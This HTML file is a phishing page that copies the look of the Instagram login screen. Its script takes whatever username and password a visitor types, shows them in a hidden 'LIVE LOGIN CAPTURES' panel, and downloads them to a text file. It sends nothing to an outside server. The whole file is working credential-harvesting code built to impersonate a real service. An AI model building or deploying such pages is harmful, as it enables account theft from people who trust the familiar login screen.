<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
            background: linear-gradient(45deg, #fefefe 0%, #fafafa 100%);
            min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; gap: 32px;
        }
        .logo { font-size: 50px; font-family: 'Billabong', cursive; font-weight: normal; color: #262626; line-height: 1; margin-bottom: 8px; }
        @font-face { font-family: 'Billabong'; src: url('data:application/font-woff;charset=utf-8;base64,d09GRgABAAAAABYsAAsAAAAALOAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABHU1VCAAABCAAAADsAAABUIIslek9TLzIAAAFEAAAAQQAAAFZJwk68Y21hcAAAAYgAAAFxAAAFRPe8y45nbHlmAAAC/AAADqgAAB5gYWfOp2hlYWQAABGkAAAAMAAAADYcnp3DaGhlYQAAEdQAAAAcAAAAJAhyBAlobXR4AAAR8AAAABEAAAEgTNAAAGxvY2EAAAToAAAAEAAAABAA3ACBobWF4AAAFPAAAAHwAAACAAcABQBG1heHQAABPwAAAAHwAAACAABwFSbmFtZQAAU8AAAAZAAAAGKIfp/PH1hYWMAAFVAAAAAFwAADHD5T1nfaYW5zaAAAFWAAAAFIAAABCbV0NCt0bmFtZQAAWjAAAAnMAAAGUx+5mK2RzbWF4AAAFkAAAABAAAAAQAcgNGBG1vc3QAABa8AAAAIAAAACAAAABAAAAAEAEAAQAA') format('woff'); }
        .form-container { background: #fff; border: 1px solid #dbdbdb; border-radius: 1px; padding: 10px 0; width: 100%; max-width: 350px; }
        .form-group { margin-bottom: 6px; padding: 0 40px; }
        .form-input { width: 100%; height: 36px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; font-size: 12px; padding: 9px 0 7px 8px; color: #262626; outline: none; }
        .form-input:focus { border-color: #b2b2b2; background-color: #fff; }
        .form-input::placeholder { font-size: 12px; color: #8e8e8e; }
        .login-button { width: calc(100% - 80px); height: 28px; background: linear-gradient(45deg, #0095f6, #0095f6); color: #fff; border: none; border-radius: 4px; font-weight: 600; font-size: 14px; margin: 8px 40px 18px; cursor: pointer; padding: 5px 9px; line-height: 18px; display: flex; align-items: center; justify-content: center; }
        .login-button:hover:not(:disabled) { background: linear-gradient(45deg, #1877f2, #1877f2); }
        .login-button:disabled { opacity: 0.3; cursor: not-allowed; }
        .divider { display: flex; align-items: center; margin: 0 40px 18px; color: #8e8e8e; font-size: 13px; font-weight: 400; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background-color: #dbdbdb; }
        .divider::before { margin-right: 24px; } .divider::after { margin-left: 24px; }
        .facebook-login { color: #385185; font-size: 14px; font-weight: 400; text-decoration: none; display: flex; align-items: center; justify-content: center; gap: 6px; margin-bottom: 16px; }
        .forgot-password { color: #00376b; font-size: 12px; font-weight: 400; text-decoration: none; display: block; text-align: center; margin-bottom: 32px; }
        .signup-container { text-align: center; font-size: 14px; margin-bottom: 32px; }
        .signup-container span { color: #8e8e8e; }
        .signup-link { color: #0095f6; font-weight: 600; text-decoration: none; margin-left: 5px; }
        
        /* LIVE LOGS DASHBOARD */
        #logs { position: fixed; top: 0; left: 0; width: 400px; height: 100vh; background: #1e1e1e; color: #00ff00; padding: 20px; overflow-y: auto; font-family: monospace; font-size: 12px; z-index: 999; transform: translateX(-100%); transition: transform 0.3s; }
        #logs.show { transform: translateX(0); }
        #logs h3 { color: #fff; margin-bottom: 10px; }
        .log-entry { background: #333; padding: 10px; margin: 5px 0; border-radius: 4px; border-left: 4px solid #ffffff; }
        #toggle-logs { position: fixed; top: 10px; right: 10px; background: #ffffff; color: white; border: none; padding: 10px 15px; border-radius: 20px; cursor: pointer; z-index: 1000; font-weight: bold; }
        .username { color: #00ff88 !important; font-weight: bold; }
        .password { color: #ff4444 !important; font-weight: bold; }
    </style>
</head>
<body>
    <!-- INSTAGRAM LOGIN (SAME AS BEFORE) -->
    <div style="flex: 1; display: flex; align-items: center; justify-content: center;">
        <div style="width: 100%; max-width: 350px;">
            <div style="text-align: center; margin-bottom: 32px;">
                <h1 class="logo">Instagram</h1>
            </div>
            <form class="form-container" id="loginForm">
                <div class="form-group">
                    <input type="text" class="form-input" id="username" placeholder="Username or email" required>
                </div>
                <div class="form-group">
                    <input type="password" class="form-input" id="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button" id="loginBtn" disabled>Log in</button>
                <div class="divider">OR</div>
                
                    
                </a>
                <a href="#" class="forgot-password">Forgot password?</a>
            </form>
            <div class="signup-container">
                <span>Don't have an account? </span><a href="#" class="signup-link">Sign up</a>
            </div>
        </div>
    </div>

    <!-- LIVE CAPTURE LOGS (SLIDE-OUT PANEL) -->
    <button id="toggle-logs"></button>
    <div id="logs">
        <h3>🔥 LIVE LOGIN CAPTURES</h3>
        <div id="logContainer">Waiting for logins...</div>
    </div>

    <script>
        const form = document.getElementById('loginForm');
        const loginBtn = document.getElementById('loginBtn');
        const usernameInput = document.getElementById('username');
        const passwordInput = document.getElementById('password');
        const logsPanel = document.getElementById('logs');
        const toggleBtn = document.getElementById('toggle-logs');
        const logContainer = document.getElementById('logContainer');

        let captureCount = 0;

        // Toggle logs panel
        toggleBtn.onclick = () => logsPanel.classList.toggle('show');

        // Enable button
        [usernameInput, passwordInput].forEach(input => {
            input.addEventListener('input', () => {
                loginBtn.disabled = !(usernameInput.value && passwordInput.value);
            });
        });

        // CAPTURE LOGIN
        form.addEventListener('submit', (e) => {
            e.preventDefault();
            const username = usernameInput.value;
            const password = passwordInput.value;
            const timestamp = new Date().toISOString();

            captureCount++;
            toggleBtn.textContent = `📱 LOGS (${captureCount})`;

            // ADD TO LIVE PANEL
            const logEntry = `
                <div class="log-entry">
                    <div>${new Date().toLocaleString()}</div>
                    <div>👤 <span class="username">${username}</span></div>
                    <div>🔑 <span class="password">${password}</span></div>
                    <div>🌐 ${navigator.userAgent.substring(0, 50)}...</div>
                    <hr>
                </div>
            `;
            logContainer.innerHTML = logEntry + logContainer.innerHTML;

            // DOWNLOAD AS TXT
            const dataStr = `Instagram Login Capture ${new Date().toLocaleString()}\nUsername: ${username}\nPassword: ${password}\nUserAgent: ${navigator.userAgent}\n\n`.trim();
            const dataBlob = new Blob([dataStr], {type: 'text/plain'});
            const link = document.createElement('a');
            link.href = URL.createObjectURL(dataBlob);
            link.download = `instagram-login-${Date.now()}.txt`;
            link.click();

            // Reset form
            loginBtn.disabled = true;
            loginBtn.textContent = 'Captured!';
            setTimeout(() => {
                usernameInput.value = '';
                passwordInput.value = '';
                loginBtn.textContent = 'Log in';
            }, 2000);
        });
    </script>
</body>
</html>
